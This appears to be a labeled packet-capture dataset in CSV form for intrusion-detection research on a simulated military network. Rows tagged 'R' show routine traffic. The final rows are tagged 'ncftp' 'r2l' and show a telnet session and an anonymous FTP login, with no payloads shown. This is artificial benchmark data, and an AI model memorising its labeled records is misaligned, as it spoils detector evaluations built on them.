"R"," R", "3017298","21:42:36.823533","","","LOOP","60","Reply"
"R"," R", "3017299","21:42:43.655011","","","ARP","60","Who has 172.16.112.100? Tell 172.16.113.50"
"R"," R", "3017300","21:42:46.821106","","","LOOP","60","Reply"
"R"," R", "3017301","21:42:51.296473","","","ARP","60","Who has 172.16.112.100? Tell 172.16.112.20"
"R"," R", "3017302","21:42:51.961823","172.16.112.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017303","21:42:51.962307","172.16.112.10","172.16.112.50","NTP","90","NTP Version 3, server"
"R"," R", "3017304","21:42:56.286024","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017305","21:42:56.286241","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017306","21:42:56.818929","","","LOOP","60","Reply"
"R"," R", "3017307","21:43:03.927924","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"R"," R", "3017308","21:43:06.928697","","","LOOP","60","Reply"
"R"," R", "3017309","21:43:07.650594","","","ARP","60","Who has 172.16.112.100? Tell 172.16.113.50"
"R"," R", "3017310","21:43:07.733899","172.16.112.20","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017311","21:43:07.734363","172.16.112.10","172.16.112.20","NTP","90","NTP Version 3, server"
"R"," R", "3017312","21:43:13.250797","172.16.113.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017313","21:43:13.251265","172.16.112.10","172.16.113.50","NTP","90","NTP Version 3, server"
"R"," R", "3017314","21:43:16.926516","","","LOOP","60","Reply"
"R"," R", "3017315","21:43:26.279732","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017316","21:43:26.279937","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017317","21:43:26.924337","","","LOOP","60","Reply"
"R"," R", "3017318","21:43:29.095204","","","CDP","324","Device ID: loud.eyrie.af.mil.eyrie.af.mil  Port ID: Ethernet1  "
"R"," R", "3017319","21:43:32.344177","172.16.114.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017320","21:43:32.344647","172.16.112.10","172.16.114.50","NTP","90","NTP Version 3, server"
"R"," R", "3017321","21:43:33.273963","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"R"," R", "3017322","21:43:37.114311","","","LOOP","60","Reply"
"R"," R", "3017323","21:43:47.111924","","","LOOP","60","Reply"
"R"," R", "3017324","21:43:51.283876","","","ARP","60","Who has 172.16.112.100? Tell 172.16.112.20"
"R"," R", "3017325","21:43:55.946170","","","ARP","60","Who has 172.16.112.10? Tell 172.16.112.50"
"R"," R", "3017326","21:43:55.946235","","","ARP","42","172.16.112.10 is at 08:00:20:83:4a:82"
"R"," R", "3017327","21:43:55.946746","172.16.112.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017328","21:43:55.947217","172.16.112.10","172.16.112.50","NTP","90","NTP Version 3, server"
"R"," R", "3017329","21:43:56.273387","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017330","21:43:56.273616","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017331","21:43:57.109679","","","LOOP","60","Reply"
"R"," R", "3017332","21:43:57.293751","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"R"," R", "3017333","21:43:57.294808","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"R"," R", "3017334","21:43:57.312513","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5383 Ack=36415 Win=32120 Len=0"
"R"," R", "3017335","21:43:59.462384","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"R"," R", "3017336","21:43:59.463456","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"R"," R", "3017337","21:43:59.482044","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5384 Ack=36416 Win=32120 Len=0"
"R"," R", "3017338","21:44:02.724078","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"R"," R", "3017339","21:44:02.725141","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"R"," R", "3017340","21:44:02.741371","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5386 Ack=36418 Win=32120 Len=0"
"R"," R", "3017341","21:44:02.742257","196.37.75.158","172.16.114.207","TELNET","115","Telnet Data ..."
"R"," R", "3017342","21:44:02.761362","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5386 Ack=36479 Win=32120 Len=0"
"R"," R", "3017343","21:44:03.032448","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"R"," R", "3017344","21:44:07.107526","","","LOOP","60","Reply"
"R"," R", "3017345","21:44:11.720256","172.16.112.20","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017346","21:44:11.720744","172.16.112.10","172.16.112.20","NTP","90","NTP Version 3, server"
"R"," R", "3017347","21:44:17.105320","","","LOOP","60","Reply"
"R"," R", "3017348","21:44:17.218575","172.16.113.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017349","21:44:17.218985","172.16.112.10","172.16.113.50","NTP","90","NTP Version 3, server"
"R"," R", "3017350","21:44:26.267157","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017351","21:44:26.267350","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017352","21:44:27.103128","","","LOOP","60","Reply"
"R"," R", "3017353","21:44:29.126687","","","CDP","324","Device ID: loud.eyrie.af.mil.eyrie.af.mil  Port ID: Ethernet1  "
"R"," R", "3017354","21:44:32.603719","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"R"," R", "3017355","21:44:35.940342","","","ARP","60","Who has 172.16.0.1? Tell 172.16.112.5"
"R"," R", "3017356","21:44:35.941827","","","ARP","60","172.16.0.1 is at 00:10:7b:38:46:33"
"R"," R", "3017357","21:44:35.941898","172.16.112.5","172.16.0.1","ICMP","64","Echo (ping) request  id=0x0008, seq=41807/20387, ttl=32"
"R"," R", "3017358","21:44:35.944086","172.16.0.1","172.16.112.5","ICMP","64","Echo (ping) reply    id=0x0008, seq=41807/20387, ttl=255 (request in 3017357)"
"R"," R", "3017359","21:44:36.330949","172.16.114.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017360","21:44:36.331449","172.16.112.10","172.16.114.50","NTP","90","NTP Version 3, server"
"R"," R", "3017361","21:44:37.124725","","","LOOP","60","Reply"
"R"," R", "3017362","21:44:45.133851","","","ARP","60","Who has 172.16.114.50? Tell 172.16.112.20"
"R"," R", "3017363","21:44:45.134008","","","ARP","60","172.16.114.50 is at 00:00:c0:17:79:5a"
"R"," R", "3017364","21:44:45.134144","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "3017365","21:44:45.134509","","","ARP","60","Who has 172.16.118.20? Tell 172.16.114.50"
"R"," R", "3017366","21:44:45.134641","","","ARP","60","172.16.118.20 is at 00:c0:4f:a3:57:db"
"R"," R", "3017367","21:44:45.134834","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"R"," R", "3017368","21:44:45.135263","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "3017369","21:44:45.136605","172.16.118.20","172.16.114.50","TELNET","78","Telnet Data ..."
"R"," R", "3017370","21:44:45.148971","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=1 Ack=25 Win=31744 Len=0"
"R"," R", "3017371","21:44:45.151620","172.16.114.50","172.16.112.20","DNS","86","Standard query 0x4372 PTR 20.118.16.172.in-addr.arpa"
"R"," R", "3017372","21:44:45.152966","172.16.112.20","172.16.114.50","DNS","175","Standard query response 0x4372 PTR 20.118.16.172.in-addr.arpa PTR linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.112.20"
"R"," R", "3017373","21:44:45.153757","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"R"," R", "3017374","21:44:45.154297","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017375","21:44:45.154541","172.16.114.50","172.16.118.20","TELNET","69","Telnet Data ..."
"R"," R", "3017376","21:44:45.168912","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=28 Ack=28 Win=31744 Len=0"
"R"," R", "3017377","21:44:45.169326","172.16.118.20","172.16.114.50","TELNET","63","Telnet Data ..."
"R"," R", "3017378","21:44:45.169553","172.16.114.50","172.16.118.20","TELNET","72","Telnet Data ..."
"R"," R", "3017379","21:44:45.180843","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=37 Ack=46 Win=32120 Len=0"
"R"," R", "3017380","21:44:45.188911","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=46 Ack=37 Win=31744 Len=0"
"R"," R", "3017381","21:44:45.189373","172.16.118.20","172.16.114.50","TELNET","87","Telnet Data ..."
"R"," R", "3017382","21:44:45.190888","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017383","21:44:45.191362","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017384","21:44:45.199575","172.16.114.50","172.16.112.20","DNS","79","Standard query 0x07dd A linux2.eyrie.af.mil"
"R"," R", "3017385","21:44:45.200159","172.16.114.50","172.16.118.20","TELNET","123","Telnet Data ..."
"R"," R", "3017386","21:44:45.200294","172.16.112.20","172.16.114.50","DNS","144","Standard query response 0x07dd A linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.112.20"
"R"," R", "3017387","21:44:45.200757","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017388","21:44:45.212175","172.16.114.50","172.16.118.20","TELNET","61","Telnet Data ..."
"R"," R", "3017389","21:44:45.230833","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=76 Ack=125 Win=32120 Len=0"
"R"," R", "3017390","21:44:45.321614","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017391","21:44:45.321932","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017392","21:44:45.340800","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=77 Ack=126 Win=32120 Len=0"
"R"," R", "3017393","21:44:45.350918","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017394","21:44:45.351220","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017395","21:44:45.370791","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=78 Ack=127 Win=32120 Len=0"
"R"," R", "3017396","21:44:45.400908","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017397","21:44:45.401208","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017398","21:44:45.420784","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=79 Ack=128 Win=32120 Len=0"
"R"," R", "3017399","21:44:45.430894","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017400","21:44:45.431193","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017401","21:44:45.450767","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=80 Ack=129 Win=32120 Len=0"
"R"," R", "3017402","21:44:45.460885","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017403","21:44:45.461185","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017404","21:44:45.480761","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=81 Ack=130 Win=32120 Len=0"
"R"," R", "3017405","21:44:45.511576","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017406","21:44:45.511886","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017407","21:44:45.530746","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=83 Ack=132 Win=32120 Len=0"
"R"," R", "3017408","21:44:45.530975","172.16.114.50","172.16.118.20","TELNET","64","Telnet Data ..."
"R"," R", "3017409","21:44:45.550744","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=83 Ack=142 Win=32120 Len=0"
"R"," R", "3017410","21:44:45.641339","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017411","21:44:45.658817","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=84 Win=31744 Len=0"
"R"," R", "3017412","21:44:45.670829","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017413","21:44:45.688809","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=85 Win=31744 Len=0"
"R"," R", "3017414","21:44:45.700857","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017415","21:44:45.718799","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=86 Win=31744 Len=0"
"R"," R", "3017416","21:44:45.730813","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017417","21:44:45.748796","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=87 Win=31744 Len=0"
"R"," R", "3017418","21:44:45.760800","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017419","21:44:45.778790","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=88 Win=31744 Len=0"
"R"," R", "3017420","21:44:45.801428","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017421","21:44:45.801777","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017422","21:44:45.820669","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=90 Ack=144 Win=32120 Len=0"
"R"," R", "3017423","21:44:45.829048","172.16.114.50","172.16.118.20","TELNET","70","Telnet Data ..."
"R"," R", "3017424","21:44:45.840662","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=90 Ack=160 Win=32120 Len=0"
"R"," R", "3017425","21:44:45.932280","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017426","21:44:45.950651","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=90 Ack=166 Win=32120 Len=0"
"R"," R", "3017427","21:44:46.041234","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017428","21:44:46.041612","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017429","21:44:46.060585","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=91 Ack=167 Win=32120 Len=0"
"R"," R", "3017430","21:44:46.070703","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017431","21:44:46.071031","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017432","21:44:46.090575","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=92 Ack=168 Win=32120 Len=0"
"R"," R", "3017433","21:44:46.100690","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017434","21:44:46.101022","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017435","21:44:46.120564","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=93 Ack=169 Win=32120 Len=0"
"R"," R", "3017436","21:44:46.130690","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017437","21:44:46.131029","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017438","21:44:46.150564","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=94 Ack=170 Win=32120 Len=0"
"R"," R", "3017439","21:44:46.150741","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017440","21:44:46.151161","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017441","21:44:46.170549","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=95 Ack=171 Win=32120 Len=0"
"R"," R", "3017442","21:44:46.180664","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017443","21:44:46.181121","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017444","21:44:46.200540","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=96 Ack=172 Win=32120 Len=0"
"R"," R", "3017445","21:44:46.200724","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017446","21:44:46.201057","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017447","21:44:46.220534","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=97 Ack=173 Win=32120 Len=0"
"R"," R", "3017448","21:44:46.220717","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017449","21:44:46.221050","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017450","21:44:46.240530","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=98 Ack=174 Win=32120 Len=0"
"R"," R", "3017451","21:44:46.241358","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017452","21:44:46.241720","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017453","21:44:46.260525","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=100 Ack=178 Win=32120 Len=0"
"R"," R", "3017454","21:44:46.543231","172.16.114.50","172.16.118.20","TELNET","115","Telnet Data ..."
"R"," R", "3017455","21:44:46.560444","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=100 Ack=239 Win=32120 Len=0"
"R"," R", "3017456","21:44:46.560908","172.16.114.50","172.16.118.20","TELNET","256","Telnet Data ..."
"R"," R", "3017457","21:44:46.580436","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=100 Ack=441 Win=32120 Len=0"
"R"," R", "3017458","21:44:46.667584","172.16.114.50","172.16.118.20","TELNET","61","Telnet Data ..."
"R"," R", "3017459","21:44:46.680410","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=100 Ack=448 Win=32120 Len=0"
"R"," R", "3017460","21:44:47.122489","","","LOOP","60","Reply"
"R"," R", "3017461","21:44:51.271222","","","ARP","60","Who has 172.16.112.100? Tell 172.16.112.20"
"R"," R", "3017462","21:44:56.260828","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017463","21:44:56.261030","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017464","21:44:57.120321","","","LOOP","60","Reply"
"R"," R", "3017465","21:44:59.930333","172.16.112.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017466","21:44:59.930801","172.16.112.10","172.16.112.50","NTP","90","NTP Version 3, server"
"R"," R", "3017467","21:45:01.290163","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"ncftp"," r2l", "3017468","21:45:06.666066","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017469","21:45:06.666556","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017470","21:45:06.684816","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=101 Ack=449 Win=32120 Len=0"
"ncftp"," r2l", "3017471","21:45:06.685008","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017472","21:45:06.685359","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017473","21:45:06.704807","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=102 Ack=450 Win=32120 Len=0"
"ncftp"," r2l", "3017474","21:45:06.704991","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017475","21:45:06.705342","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017476","21:45:06.724808","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=103 Ack=451 Win=32120 Len=0"
"ncftp"," r2l", "3017477","21:45:06.724983","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017478","21:45:06.725336","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017479","21:45:06.744806","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=104 Ack=452 Win=32120 Len=0"
"ncftp"," r2l", "3017480","21:45:06.744978","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017481","21:45:06.745331","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017482","21:45:06.764790","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=105 Ack=453 Win=32120 Len=0"
"ncftp"," r2l", "3017483","21:45:06.765071","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017484","21:45:06.765423","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017485","21:45:06.784785","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=106 Ack=454 Win=32120 Len=0"
"ncftp"," r2l", "3017486","21:45:06.784973","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017487","21:45:06.785325","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017488","21:45:06.804778","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=107 Ack=455 Win=32120 Len=0"
"ncftp"," r2l", "3017489","21:45:06.804962","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017490","21:45:06.805313","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017491","21:45:06.824776","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=108 Ack=456 Win=32120 Len=0"
"ncftp"," r2l", "3017492","21:45:06.824957","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017493","21:45:06.825310","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017494","21:45:06.844767","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=109 Ack=457 Win=32120 Len=0"
"ncftp"," r2l", "3017495","21:45:06.844950","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017496","21:45:06.845302","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017497","21:45:06.864764","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=110 Ack=458 Win=32120 Len=0"
"ncftp"," r2l", "3017498","21:45:06.864946","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017499","21:45:06.865299","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017500","21:45:06.884755","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=111 Ack=459 Win=32120 Len=0"
"ncftp"," r2l", "3017501","21:45:06.884940","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017502","21:45:06.885292","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017503","21:45:06.904750","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=112 Ack=460 Win=32120 Len=0"
"ncftp"," r2l", "3017504","21:45:06.904934","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017505","21:45:06.905286","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017506","21:45:06.924745","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=113 Ack=461 Win=32120 Len=0"
"ncftp"," r2l", "3017507","21:45:06.924929","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017508","21:45:06.925282","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017509","21:45:06.944740","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=114 Ack=462 Win=32120 Len=0"
"ncftp"," r2l", "3017510","21:45:06.944922","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017511","21:45:06.945274","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017512","21:45:06.964734","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=115 Ack=463 Win=32120 Len=0"
"ncftp"," r2l", "3017513","21:45:06.964917","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017514","21:45:06.965270","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017515","21:45:06.984728","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=116 Ack=464 Win=32120 Len=0"
"ncftp"," r2l", "3017516","21:45:06.984912","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017517","21:45:06.985264","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017518","21:45:07.004724","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=117 Ack=465 Win=32120 Len=0"
"ncftp"," r2l", "3017519","21:45:07.004907","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017520","21:45:07.005259","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017521","21:45:07.024804","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=118 Ack=466 Win=32120 Len=0"
"ncftp"," r2l", "3017522","21:45:07.025753","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017523","21:45:07.044397","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=466 Ack=120 Win=31744 Len=0"
"ncftp"," r2l", "3017524","21:45:07.075316","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017525","21:45:07.076855","172.16.114.50","172.16.112.20","DNS","86","Standard query 0x7680 PTR 20.118.16.172.in-addr.arpa"
"ncftp"," r2l", "3017526","21:45:07.078023","172.16.112.20","172.16.114.50","DNS","175","Standard query response 0x7680 PTR 20.118.16.172.in-addr.arpa PTR linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017527","21:45:07.078645","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017528","21:45:07.079180","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "3017529","21:45:07.079408","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=1 Ack=1 Win=31744 Len=0"
"ncftp"," r2l", "3017530","21:45:07.094755","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=120 Ack=468 Win=32120 Len=0"
"ncftp"," r2l", "3017531","21:45:07.095015","172.16.114.50","172.16.118.20","TELNET","93","Telnet Data ..."
"ncftp"," r2l", "3017532","21:45:07.114712","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=120 Ack=507 Win=32120 Len=0"
"ncftp"," r2l", "3017533","21:45:07.201509","172.16.118.20","172.16.114.50","FTP","163","Response: 220 linux2.eyrie.af.mil FTP server (Version wu-2.4.2-academ[BETA-18](1) Mon Aug 3 19:17:20 EDT 1998) ready."
"ncftp"," r2l", "3017534","21:45:07.201975","172.16.114.50","172.16.118.20","FTP","70","Request: USER anonymous"
"ncftp"," r2l", "3017535","21:45:07.214693","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [ACK] Seq=110 Ack=17 Win=32736 Len=0"
"ncftp"," r2l", "3017536","21:45:07.259823","172.16.118.20","172.16.114.50","FTP","122","Response: 331 Guest login ok, send your complete e-mail address as password."
"ncftp"," r2l", "3017537","21:45:07.260163","172.16.114.50","172.16.118.20","FTP","84","Request: PASS bramy@marx.eyrie.af.mil"
"ncftp"," r2l", "3017538","21:45:07.274679","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [ACK] Seq=178 Ack=47 Win=32736 Len=0"
"ncftp"," r2l", "3017539","21:45:07.290509","","","LOOP","60","Reply"
"ncftp"," r2l", "3017540","21:45:07.309045","172.16.118.20","172.16.114.50","FTP","102","Response: 230 Guest login ok, access restrictions apply."
